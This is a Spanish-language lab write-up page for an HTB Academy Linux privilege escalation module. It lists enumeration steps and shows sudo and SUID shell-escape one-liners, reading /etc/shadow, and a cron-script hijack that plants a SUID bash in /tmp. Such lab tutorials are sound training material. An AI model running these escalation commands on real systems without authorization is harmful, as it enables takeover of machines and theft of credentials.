@@ -1,0 +1,264 @@
+<!DOCTYPE html><html lang="es"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="HTB Academy - Linux Privilege Escalation - HTB Challenge"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><title>HTB Academy - Linux Privilege Escalation | HTB Challenge</title><link rel="stylesheet" href="/challenges/_astro/_slug_-Bxg8atdN.css">
+<style>.markdown-body{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;line-height:1.8;color:#e5e7eb}.markdown-body h1{font-size:2rem;font-weight:700;color:#f97316;margin:2rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid #374151}.markdown-body h2{font-size:1.5rem;font-weight:600;color:#22d3ee;margin:1.75rem 0 1rem;padding-bottom:.25rem}.markdown-body h3{font-size:1.25rem;font-weight:600;color:#a5f3fc;margin:1.5rem 0 .75rem}.markdown-body p{margin:.75rem 0;color:#d1d5db}.markdown-body strong{color:#fbbf24;font-weight:600}.markdown-body ul,.markdown-body ol{margin:.75rem 0;padding-left:1.5rem;color:#d1d5db}.markdown-body li{margin:.5rem 0;list-style-type:disc}.markdown-body table{width:100%;margin:1rem 0;border-collapse:collapse;font-size:.9rem}.markdown-body th,.markdown-body td{padding:.75rem;border:1px solid #374151;text-align:left}.markdown-body th{background:#37415180;color:#fbbf24;font-weight:600}.markdown-body td{color:#d1d5db}.markdown-body code{background:#06b6d426;color:#22d3ee;padding:.2rem .5rem;border-radius:.375rem;font-family:SF Mono,Monaco,Courier New,monospace;font-size:.875rem}.markdown-body pre{background:#0f172a;padding:1rem;border-radius:.75rem;overflow-x:auto;margin:1rem 0;border:1px solid #1e293b}.markdown-body pre code{background:transparent;padding:0;color:#a5b4fc}
+</style></head> <body class="bg-dark-bg text-gray-100 min-h-screen"> <header class="bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 border-b border-dark-border"> <nav class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4"> <nav class="flex mb-6" aria-label="Breadcrumb"> <ol class="flex items-center space-x-2"> <li class="flex items-center">  <a href="/challenges" class="text-cyan-400 hover:text-cyan-300 transition-colors"> Challenges </a> </li><li class="flex items-center"> <span class="text-gray-500 mx-2">/</span> <a href="/challenges/htb" class="text-cyan-400 hover:text-cyan-300 transition-colors"> HTB </a> </li><li class="flex items-center"> <span class="text-gray-500 mx-2">/</span> <span class="text-gray-300 font-medium">HTB Academy - Linux Privilege Escalation</span> </li> </ol> </nav> </nav> <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12"> <div class="flex items-center space-x-4 mb-4"> <span class="px-4 py-2 bg-gradient-to-r from-green-500 to-teal-600 rounded-full text-lg font-bold text-white">
+🎯
+</span> <span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">✅ Completado</span> <span class="px-3 py-1 bg-slate-700 rounded-full text-sm">⭐ medium</span> <span class="px-3 py-1 bg-slate-700 rounded-full text-sm">HTB</span> </div> <h1 class="text-4xl font-bold text-white mb-2">HTB Academy - Linux Privilege Escalation</h1> <p class="text-gray-400">HTB Challenge</p> </div> </header> <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12"> <article class="prose prose-invert max-w-none"> <div class="bg-dark-card rounded-xl border border-dark-border p-8">  <div class="flex flex-wrap gap-2 mb-6"> <span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#privilege-escalation</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#linux</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#sudo</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#suid</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#htb-academy</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#pentesting</span> </div> <div class="markdown-body"><h1>🎓 HTB Academy - Linux Privilege Escalation</h1>
+<h2>🎭 Escalada de Privilegios en Linux</h2>
+<hr>
+<p>👨‍🏫 <strong>Del Instructor</strong>: Bienvenido al módulo de Privilege Escalation. Como Pentester, obtener acceso inicial es solo el primer paso. La escalada de privilegios te permite pasar de usuario estándar a root, completando la cadena de ataque y demostrando el impacto real de la vulnerabilidad.</p>
+<blockquote>
+<p>🎯 <strong>Mentalidad de Hacker</strong>: &quot;El acceso inicial es solo la puerta de entrada. El verdadero valor está en lo que puedes hacer después. Cada sistema tiene debilidades que permiten escalar - tu trabajo es encontrarlas.&quot;</p>
+</blockquote>
+<hr>
+<h2>🎭 El Escenario: Post-Exploitation</h2>
+<h3>Contexto del Pentest</h3>
+<p>Has obtenido acceso a un servidor Linux mediante una vulnerabilidad web. Tu shell inicial es como usuario <code>www-data</code>. Tu objetivo es escalar a <code>root</code> para demostrar el impacto completo del compromiso.</p>
+<p><strong>Tu misión como Pentester</strong>:</p>
+<ul>
+<li>Enumerar el sistema buscando vectores de escalada</li>
+<li>Identificar binarios SUID vulnerables</li>
+<li>Explotar configuraciones sudo incorrectas</li>
+<li>Documentar el camino al root</li>
+</ul>
+<h2>🧠 Fundamentos de Análisis: Privilege Escalation Vectors</h2>
+<h3>Vectores Comunes de Escalada</h3>
+<pre><code>Privilege Escalation Attack Tree:
+├── Kernel Exploits
+│   └── Dirty COW, Heap Spray
+├── SUID Binaries
+│   └── find, nmap, vim, cp
+├── Sudo Misconfigurations
+│   └── NOPASSWD, GTFOBins
+├── Cron Jobs
+│   └── Wildcards, Path injection
+├── Capabilities
+│   └── cap_setuid, cap_net_raw
+└── Stored Credentials
+    └── .bash_history, config files
+</code></pre>
+<h3>Herramientas de Enumeración</h3>
+<table>
+<thead>
+<tr>
+<th>Herramienta</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>linpeas.sh</code></td>
+<td>Enumeración automática</td>
+</tr>
+<tr>
+<td><code>linux-exploit-suggester</code></td>
+<td>Kernel exploits</td>
+</tr>
+<tr>
+<td><code>find</code></td>
+<td>SUID/SGID binaries</td>
+</tr>
+<tr>
+<td><code>sudo -l</code></td>
+<td>Sudo permissions</td>
+</tr>
+</tbody></table>
+<h2>🔍 Metodología de Investigación</h2>
+<h3>Paso 1: Enumeración Manual Inicial</h3>
+<pre><code class="language-bash"># Información del sistema
+uname -a
+cat /etc/os-release
+hostname
+
+# Usuario actual
+id
+whoami
+groups
+
+# Buscar SUID binaries
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# Buscar SGID binaries
+find / -perm -2000 -type f 2&gt;/dev/null
+
+# Capabilities
+getcap -r / 2&gt;/dev/null
+
+# Sudo permissions
+sudo -l
+</code></pre>
+<h3>Paso 2: Análisis de SUID Binaries</h3>
+<pre><code class="language-bash"># Lista común de SUID vulnerables
+# Verificar si existen:
+ls -la /usr/bin/find
+ls -la /usr/bin/nmap
+ls -la /usr/bin/vim
+ls -la /usr/bin/cp
+ls -la /bin/mount
+
+# Si find es SUID:
+find / -exec whoami \; -quit
+# Output: root (¡Escalada exitosa!)
+
+# Si nmap antiguo es SUID:
+nmap --interactive
+nmap&gt; !sh
+# Shell como root
+
+# GTFOBins - buscar exploits
+# https://gtfobins.github.io/
+</code></pre>
+<h3>Paso 3: Análisis de Sudo</h3>
+<pre><code class="language-bash"># Ver permisos sudo
+sudo -l
+
+# Ejemplos peligrosos comunes:
+# (root) NOPASSWD: /usr/bin/find
+sudo find / -exec /bin/sh \;
+
+# (root) NOPASSWD: /usr/bin/vim
+sudo vim -c &#39;:!/bin/sh&#39;
+
+# (root) NOPASSWD: /usr/bin/cat
+sudo cat /etc/shadow
+
+# (root) NOPASSWD: /usr/bin/python
+sudo python -c &#39;import os; os.system(&quot;/bin/sh&quot;)&#39;
+
+# (root) NOPASSWD: /usr/bin/perl
+sudo perl -e &#39;exec &quot;/bin/sh&quot;;&#39;
+</code></pre>
+<h3>Paso 4: Análisis de Cron Jobs</h3>
+<pre><code class="language-bash"># Ver cron jobs del sistema
+cat /etc/crontab
+ls -la /etc/cron.*
+
+# Ver cron del usuario actual
+crontab -l
+
+# Buscar scripts escribibles
+find /etc/cron* -writable 2&gt;/dev/null
+
+# Si un cron corre como root y es escribible:
+echo &#39;#!/bin/bash&#39; &gt; /path/to/script.sh
+echo &#39;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash&#39; &gt;&gt; /path/to/script.sh
+
+# Esperar a que se ejecute o forzar
+/tmp/bash -p  # Obtiene shell root
+</code></pre>
+<h3>Paso 5: Usar LinPEAS (Automatizado)</h3>
+<pre><code class="language-bash"># Descargar LinPEAS
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+chmod +x linpeas.sh
+
+# Ejecutar
+./linpeas.sh
+
+# LinPEAS colorea automáticamente:
+# 🔴 Rojo = Alto riesgo
+# 🟡 Amarillo = Riesgo medio
+# 🟢 Verde = Informativo
+
+# Buscar en output:
+# - SUID binaries (rojo)
+# - Sudo misconfig (rojo)
+# - Writable files (amarillo)
+# - Credentials in files (rojo)
+</code></pre>
+<h2>🛠️ Arsenal de Herramientas</h2>
+<table>
+<thead>
+<tr>
+<th>Herramienta</th>
+<th>Uso</th>
+<th>Comando</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>linpeas.sh</code></td>
+<td>Enumeración completa</td>
+<td><code>./linpeas.sh</code></td>
+</tr>
+<tr>
+<td><code>sudo -l</code></td>
+<td>Ver permisos sudo</td>
+<td><code>sudo -l</code></td>
+</tr>
+<tr>
+<td><code>find</code></td>
+<td>Buscar SUID</td>
+<td><code>find / -perm -4000</code></td>
+</tr>
+<tr>
+<td><code>GTFOBins</code></td>
+<td>Exploits para binarios</td>
+<td><a href="https://gtfobins.github.io">https://gtfobins.github.io</a></td>
+</tr>
+<tr>
+<td><code>pspy</code></td>
+<td>Monitor de procesos</td>
+<td><code>./pspy64</code></td>
+</tr>
+</tbody></table>
+<h2>✅ Checklist de Verificación</h2>
+<ul>
+<li><input disabled="" type="checkbox"> Enumeración básica del sistema</li>
+<li><input disabled="" type="checkbox"> Identificar SUID binaries</li>
+<li><input disabled="" type="checkbox"> Verificar permisos sudo</li>
+<li><input disabled="" type="checkbox"> Analizar cron jobs</li>
+<li><input disabled="" type="checkbox"> Buscar capabilities</li>
+<li><input disabled="" type="checkbox"> Revisar archivos de credenciales</li>
+<li><input disabled="" type="checkbox"> Documentar vector de escalada</li>
+<li><input disabled="" type="checkbox"> Obtener acceso root</li>
+</ul>
+<h2>🎓 Lo Que Acabas de Aprender</h2>
+<p><strong>Habilidades Técnicas</strong>:</p>
+<ul>
+<li>Enumeración manual de vectores de escalada</li>
+<li>Uso de herramientas automatizadas (LinPEAS)</li>
+<li>Explotación de SUID binaries</li>
+<li>Abuso de sudo misconfigurations</li>
+</ul>
+<p><strong>Mentalidad de Pentester</strong>:</p>
+<ul>
+<li><strong>Enumeración exhaustiva</strong>: Nunca asumir, siempre verificar</li>
+<li><strong>Documentación</strong>: Registrar cada vector probado</li>
+<li><strong>Creatividad</strong>: Combinar técnicas para escalada</li>
+</ul>
+<h2>🚀 Próximos Pasos</h2>
+<ol>
+<li><strong>Windows Privilege Escalation</strong>: Técnicas para sistemas Windows</li>
+<li><strong>Active Directory</strong>: Escalada en entornos de dominio</li>
+<li><strong>Persistence</strong>: Mantener acceso después de escalada</li>
+<li><strong>Looting</strong>: Extraer información sensible</li>
+</ol>
+<h2>📚 Recursos HTB Academy</h2>
+<ul>
+<li><a href="https://academy.hackthebox.com/module/details/51">HTB Academy - Linux PrivEsc Module</a></li>
+<li><a href="https://gtfobins.github.io/">GTFOBins</a></li>
+<li><a href="https://github.com/carlospolop/PEASS-ng">LinPEAS GitHub</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings - PrivEsc</a></li>
+</ul>
+<hr>
+<h2>✅ Estado</h2>
+<p><strong>LISTO PARA COMPLETAR</strong> 🔵</p>
+<ul>
+<li>📅 Fecha: 2026-02-17</li>
+<li>⏱️ Tiempo estimado: 40 minutos</li>
+<li>🎯 Dificultad: Media (HTB Academy Intermediate)</li>
+</ul>
+</div> </div> </article> <div class="mt-8 flex justify-between items-center"> <a href="/challenges/htb/" class="px-6 py-3 bg-slate-700 hover:bg-slate-600 rounded-lg transition-colors">
+← Volver
+</a> <button onclick="openModal('privilege-escalation/linux-privesc')" class="px-6 py-3 bg-gradient-to-r from-green-500 to-teal-600 hover:from-green-600 hover:to-teal-700 rounded-lg transition-all font-medium flex items-center gap-2 shadow-lg shadow-green-500/25"> <span>📋</span> <span>Ver Solución Paso a Paso</span> </button> </div> </main> <div id="modal-privilege-escalation/linux-privesc" class="fixed inset-0 bg-black bg-opacity-50 hidden z-50" aria-hidden="true"> <div class="flex items-center justify-center min-h-screen p-4"> <div class="bg-slate-800 rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto"> <div class="p-6 border-b border-slate-700"> <div class="flex justify-between items-start"> <div> <h2 class="text-2xl font-bold text-gray-100">HTB Academy - Linux Privilege Escalation</h2> <div class="flex items-center gap-4 mt-2 text-sm"> <span class="capitalize bg-slate-700 px-2 py-1 rounded">privilege-escalation</span> <span class="text-cyan-400">medium</span>  </div> </div> <button onclick="closeModal('privilege-escalation/linux-privesc')" class="text-gray-400 hover:text-white">
+✕
+</button> </div> </div> <div class="p-6"> <div class="mb-6"> <h3 class="text-lg font-semibold text-cyan-400 mb-4">Pasos a Seguir</h3> <div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">1. Comandos de Solución</h4> <pre class="bg-slate-900 p-3 rounded text-sm text-green-400 mb-2 overflow-x-auto">
+
+                    <code>uname -a
+cat /etc/os-release
+hostname
+id
+whoami
+groups
+find / -perm -4000 -type f 2&gt;/dev/null
+find / -perm -2000 -type f 2&gt;/dev/null
+getcap -r / 2&gt;/dev/null
+sudo -l</code>
+                  </pre>  </div> </div> <div class="mb-6"> <h3 class="text-lg font-semibold text-yellow-400 mb-4">Verificación</h3> <ul class="space-y-2"> <li class="flex items-center text-gray-300"> <span class="text-green-400 mr-2">✓</span> Reto completado </li><li class="flex items-center text-gray-300"> <span class="text-green-400 mr-2">✓</span> Puntuación obtenida </li> </ul> </div>   </div> </div> </div> </div> <script type="module">document.addEventListener("click",e=>{const t=e.target;t.classList.contains("bg-black")&&(t.classList.add("hidden"),t.setAttribute("aria-hidden","true"))});</script> <footer class="border-t border-dark-border mt-16"> <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 text-center text-gray-500 text-sm"> <p>Technical Challenges Repository | HTB Challenge</p> </div> </footer> <script type="module">function e(d){const o=document.getElementById(`modal-${d}`);o&&(o.classList.remove("hidden"),document.body.style.overflow="hidden")}window.openModal=e;</script> </body> </html>
